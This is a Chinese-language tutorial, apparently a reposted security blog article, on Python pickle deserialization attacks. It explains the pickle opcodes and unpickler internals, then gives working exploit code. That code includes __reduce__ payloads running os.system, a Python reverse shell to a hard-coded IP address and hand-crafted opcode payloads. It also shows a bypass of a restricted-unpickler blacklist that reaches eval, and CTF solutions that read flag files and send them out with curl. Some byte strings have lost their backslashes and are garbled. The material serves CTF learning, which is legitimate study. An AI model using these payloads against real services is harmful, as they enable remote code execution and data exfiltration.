# Python pickle反序列化浅析

> 原文: https://www.ctfiot.com/64787.html
> ID: 64787

opcode
描述
具体写法
栈上的变化
memo上的变化

c
获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）
c[module]n[instance]n
获得的对象入栈
无

o
寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）
o
这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈
无

i
相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）
i[module]n[callable]n
这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈
无

N
实例化一个None
N
获得的对象入栈
无

S
实例化一个字符串对象
S’xxx’n（也可以使用双引号、’等python字符串形式）
获得的对象入栈
无

V
实例化一个UNICODE字符串对象
Vxxxn
获得的对象入栈
无

I
实例化一个int对象
Ixxxn
获得的对象入栈
无

F
实例化一个float对象
Fx.xn
获得的对象入栈
无

R
选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数
R
函数和参数出栈，函数的返回值入栈
无

.
程序结束，栈顶的一个元素作为pickle.loads()的返回值
.
无
无

(
向栈中压入一个MARK标记
(
MARK标记入栈
无

t
寻找栈中的上一个MARK，并组合之间的数据为元组
t
MARK标记以及被组合的数据出栈，获得的对象入栈
无

)
向栈中直接压入一个空元组
)
空元组入栈
无

l
寻找栈中的上一个MARK，并组合之间的数据为列表
l
MARK标记以及被组合的数据出栈，获得的对象入栈
无

]
向栈中直接压入一个空列表
]
空列表入栈
无

d
寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）
d
MARK标记以及被组合的数据出栈，获得的对象入栈
无

}
向栈中直接压入一个空字典
}
空字典入栈
无

p
将栈顶对象储存至memo_n
pnn
无
对象被储存

g
将memo_n的对象压栈
gnn
对象被压栈
无

0
丢弃栈顶对象
0
栈顶对象被丢弃
无

b
使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置
b
栈上第一个元素出栈
无

s
将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中
s
第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新
无

u
寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中
u
MARK标记以及被组合的数据出栈，字典被更新
无

a
将栈的第一个元素append到第二个元素(列表)中
a
栈顶元素出栈，第二个元素（列表）被更新
无

e
寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中
e
MARK标记以及被组合的数据出栈，列表被更新
无

推荐阅读：

Edge浏览器-通过XSS获取高权限从而RCE

The End of AFR?

java免杀合集

ATT&CK中的攻与防——T1059

若依(RuoYi)管理系统后台sql注入漏洞分析

跳跳糖持续向广大安全从业者征集高质量技术文章，可以是漏洞分析，事件分析，渗透技巧，安全工具等等。

通过审核且发布将予以500RMB-1000RMB不等的奖励，具体文章要求可以查看“投稿须知”。

阅读更多原创技术文章，戳“阅读全文”


```
pickle.dump(obj, file)
//将obj对象进行封存，即序列化，然后写入到file文件中
//注:这里的file需要以wb打开(二进制可写模式)
pickle.load(file)
//将file这个文件进行解封，即反序列化
//注:这里的file需要以rb打开(二进制可读模式)
pickle.dumps(obj)
//将obj对象进行封存，即序列化，然后将其作为bytes类型直接返回
pickle.loads(data)
//将data解封，即进行反序列化
//注:data要求为bytes-like object(字节类对象)
```



```
import pickle

zj = 'tttang'

filename = "tttang"
# 序列化
with open(filename, 'wb') as f:#以二进制可写形式打开tttang这个文件
    pickle.dump(zj, f) #将zj这个变量对应的字符串进行序列化并写入到f中
# 读取序列化后生成的文件
with open(filename, "rb") as f:
    print(f.read())

# 反序列化
with open(filename, "rb") as f: #以二进制可读形式打开tttang这个文件
    print(pickle.load(f)) #将这个文件进行反序列化并输出
```



```
try:
            while True:
                key = read(1)
                if not key:
                    raise EOFError
                assert isinstance(key, bytes_types)
                dispatch[key[0]](self)
        except _Stop as stopinst:
            return stopinst.value
```



```
b'x80x04x95nx00x00x00x00x00x00x00x8cx06tttangx94.'
```



```
def load_proto(self):
        proto = self.read(1)[0]
        if not 0 <= proto <= HIGHEST_PROTOCOL:
            raise ValueError("unsupported pickle protocol: %d" % proto)
        self.proto = proto
```



```
FRAME            = b'x95'  # indicate the beginning of a new frame
```



```
def load_frame(self):
        frame_size, = unpack('<Q', self.read(8))
        if frame_size > sys.maxsize:
            raise ValueError("frame size > sys.maxsize: %d" % frame_size)
        self._unframer.load_frame(frame_size)
```



```
def load_short_binunicode(self):
        len = self.read(1)[0]
        self.append(str(self.read(len), 'utf-8', 'surrogatepass'))
```



```
self.stack = []
self.append = self.stack.append
```



```
def load_memoize(self):
        memo = self.memo
        memo[len(memo)] = self.stack[-1]
```



```
import pickle

class tttang:
    def __init__(self,name,age):
        self.name=name
        self.age=age
a=pickle.dumps(tttang("quan9i","19"))
print(a)
```



```
b'x80x04x95:x00x00x00x00x00x00x00x8cx08__main__x94x8cx06tttangx94x93x94)x81x94}x94(x8cx04namex94x8cx06quan9ix94x8cx03agex94x8cx0219x94ub.'
```



```
stack:[__main__]
```



```
stack:[__main__,tttang]
```



```
stack:[<class '__main__.tttang'>]
```



```
stack:[<class '__main__.tttang'>,()]
```



```
stack:[<class '__main__.tttang'>]
```



```
stack:[<class '__main__.tttang'>,{}]
```



```
stack:[name]
```



```
stack:[name,quan9i]
```



```
stack:[name,quan9i,age]
```



```
stack:[name,quan9i,age,19]
```



```
__main__.tttang[items[0]]=items[1]
__main__.tttang[items[2]]=items[3]
```



```
__main__.tttang[name]=quan9i
__main__.tttang[age]=19
```



```
stack:[<class '__main__.tttang'>,{'name':'quan9i','age':'19'}]
```



```
import pickle
import pickletools
class tttang:
    def __init__(self,name,age):
        self.name=name
        self.age=age
a=pickle.dumps(tttang("quan9i","19"))
print(a)
pickletools.dis(a)
```



```
key='flag{xxx}'
```



```
c__main__
secret
(S'key'
S'tttang'
db.
```



```
import pickle
import secret

payload='''c__main__
secret
(S'key'
S'tttang'
db.'''

print('before:',secret.key)

output=pickle.loads(payload.encode())

print('output:',output)
print('after:',secret.key)
```



```
__reduce__
调用:被定义之后，当对象被pickle时就会触发
作用:如果接收到的是字符串，就会把这个字符串当成一个全局变量的名称，然后Python查找它并进去pickle
    如果接收到的是元组，这个元组应该包含2-6个元素，其中包括：一个可调用对象，用于创建对象，参数元素，供对象调用
```



```
#encoding: utf-8
import os
import pickle
class tttang(object):
    def __reduce__(self):
        return (os.system,('whoami',))
a=tttang()
payload=pickle.dumps(a)
print(payload)
pickle.loads(payload)
```



```
import pickle
import os

class tttang(object):
    def __reduce__(self):
        a="""
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("124.222.255.142",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        return (os.system,(a,))

a = tttang()
pickle.loads(pickle.dumps(a))
```



```
def load_reduce(self):
        stack = self.stack
        args = stack.pop()
        func = stack[-1]
        stack[-1] = func(*args)
```



```
a=b'cosnsystemnXx06x00x00x00whoamix85R.'
```



```
import pickle
a=b'cosnsystemnXx06x00x00x00whoamix85R.'
flag=pickle.loads(a)
```



```
def load_inst(self):
        module = self.readline()[:-1].decode("ascii")
        name = self.readline()[:-1].decode("ascii")
        klass = self.find_class(module, name)
        self._instantiate(klass, self.pop_mark())
```



```
def pop_mark(self):
        items = self.stack
        self.stack = self.metastack.pop()
        self.append = self.stack.append
        return items
```



```
b'(Xx06x00x00x00whoamiiosnsystemn.'
```



```
import pickle
a=b'(Xx06x00x00x00whoamiiosnsystemn.'
b=pickle.loads(a)
```



```
def load_obj(self):
        # Stack is ... markobject classobject arg1 arg2 ...
        args = self.pop_mark()
        cls = args.pop(0)
        self._instantiate(cls, args)
```



```
b'(cosnsystemnXx06x00x00x00whoamio.'
```



```
import pickle
a=b'(cosnsystemnXx06x00x00x00whoamio.'
b=pickle.loads(a)
```



```
def load_build(self):
        stack = self.stack
        state = stack.pop()
        inst = stack[-1]
        setstate = getattr(inst, "__setstate__", None)
        if setstate is not None:
            setstate(state)
            return
        slotstate = None
        if isinstance(state, tuple) and len(state) == 2:
            state, slotstate = state
        if state:
            inst_dict = inst.__dict__
            intern = sys.intern
            for k, v in state.items():
                if type(k) is str:
                    inst_dict[intern(k)] = v
                else:
                    inst_dict[k] = v
        if slotstate:
            for k, v in slotstate.items():
                setattr(inst, k, v)
```



```
b'c__main__ntttangn)x81}Xx0Cx00x00x00__setstate__cosnsystemnsbXx06x00x00x00whoamib.'
```



```
import pickle
class tttang:
    def __init__(self):
            self.name="quan9i"
a=b'c__main__ntttangn)x81}Xx0Cx00x00x00__setstate__cosnsystemnsbXx06x00x00x00whoamib.'
b=pickle.loads(a)
```



```
import pickle
import io
import builtins
__all__ = ('PickleSerializer',)
class RestrictedUnpickler(pickle.Unpickler):
    blacklist={'eval','exec','open','__import__','exit','input'}
    def find_class(self,module,name):
        if module == "builtins" and name not in self.blacklist:
            return getattr(builtins,name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden"%(module ,name))
```



```
builtins.getattr(builtins, 'eval'),('__import__("os").system("whoami")',)
```



```
cbuiltins
getattr
```



```
builtins = builtins.globals().get('builtins')
```



```
cbuiltins
globals  #得到builtins.globals
cbuiltins
getattr
(cbuiltins
dict
S'get'
tR.   #获取到globals中的dict类中的get方法
```



```
cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals   #得到globals()
(tRS'builtins' #读取builtins
tR. #t是与(形成元组，R是执行，师傅们自行解读一下可以就理解了
```



```
import pickle,builtins

payload=b"""cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
(tRS'builtins'
tR.
"""
a=pickle.loads(payload)
print(a)
```



```
b"""cbuiltins
getattr
(cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
(tRS'builtins'
tRS'eval'
tRp1
(S'__import__("os").system("whoami")'
tR."""
```



```
o操作码：
b'x80x03(cbuiltinsngetattrnp0ncbuiltinsndictnp1nXx03x00x00x00getop2n0(g2n(cbuiltinsnglobalsnoXx0Cx00x00x00__builtins__op3n(g0ng3nXx04x00x00x00evalop4n(g4nXx21x00x00x00__import__("os").system("whoami")o.'
```



```
c__main__
secret
(S'key'
S'tttang'
db.
```



```
c__main__
secret
(Vu006bey
S'tttang'
db.
```



```
c__main__
secret
(S'x6bey'
S'tttang'
db.
```



```
import secret
import sys
print(dir(sys.modules['secret']))
```



```
import secret
import sys
print(next(reversed(dir(sys.modules['secret']))))
```



```
(c__main__
secret
i__builtin__
dir
```



```
((c__main__
secret
i__builtin__
dir
i__builtin__
reversed
```



```
(((c__main__
secret
i__builtin__
dir
i__builtin__
reversed
i__builtin__
next
```



```
import secret
import pickle
import sys
opcode=b'''(((c__main__
secret
i__builtin__
dir
i__builtin__
reversed
i__builtin__
next
.'''
print(pickle.loads(opcode))
```



```
import pickle
import secret

payload=b'''c__main__
secret
((((c__main__
secret
i__builtin__
dir
i__builtin__
reversed
i__builtin__
next
S'tttang'
db.'''
print('before:',secret.key)

output=pickle.loads(payload)

print('output:',output)
print('after:',secret.key)
```



```
import time
import requests
url = "http://8e197801-2f87-4e36-aee6-a2390b0f391e.node4.buuoj.cn:81/shop?page="
for i in range(1,300):
    res = requests.get(url+str(i))
    time.sleep(0.5)
    if "lv6.png" in res.text:
        print(i)
        break
```



```
import pickle
import urllib
import commands

class flag(object):
    def __reduce__(self):
        return (commands.getoutput,('ls /',))

a = flag()
print(urllib.quote(pickle.dumps(a)))
```



```
import pickle
import urllib
import commands

class flag(object):
    def __reduce__(self):
        return (commands.getoutput,('cat /flag.txt',))

a = flag()
print(urllib.quote(pickle.dumps(a)))
```



```
gAN9cQAoWAUAAABtb25leXEBTYYBWAcAAABoaXN0b3J5cQJdcQMoWBQAAABZdW1teSBzbcO2cmfDpXNndXJrYXEEWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBWVYEAAAAGFudGlfdGFtcGVyX2htYWNxBlggAAAAMjllYTdlODgyODJmOTJmNGZmYzI5NzZmMTQ5MDU2OTdxB3Uu
```



```
import pickle
from base64 import *
a='gAN9cQAoWAUAAABtb25leXEBTYYBWAcAAABoaXN0b3J5cQJdcQMoWBQAAABZdW1teSBzbcO2cmfDpXNndXJrYXEEWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBWVYEAAAAGFudGlfdGFtcGVyX2htYWNxBlggAAAAMjllYTdlODgyODJmOTJmNGZmYzI5NzZmMTQ5MDU2OTdxB3Uu'
print(pickle.loads(b64decode(a)))
```



```
{'money': 390, 'history': ['Yummy smörgåsgurka', 'Yummy standard pickle'], 'anti_tamper_hmac': '29ea7e88282f92f4ffc2976f14905697'}
```



```
import base64
import pickle

class flag(object):
    def __reduce__(self):
        return (eval, ("__import__('os').system('cat /f*')",))
a = flag()
print( base64.b64encode( pickle.dumps(a) ) )
```



```
import base64
import pickle

class payload(object):
    def __reduce__(self):
        return (eval,("__import__('os').system('curl -d @flag.txt  ip:7777')",))
a = payload()
print(base64.b64encode(pickle.dumps(a)))
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/2-1666318652.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/4-1666318652.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/7-1666318653.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/10-1666318654.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/6-1666318655.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/4-1666318656.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/2-1666318658.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/5-1666318658.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/10-1666318659.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1666318660.png)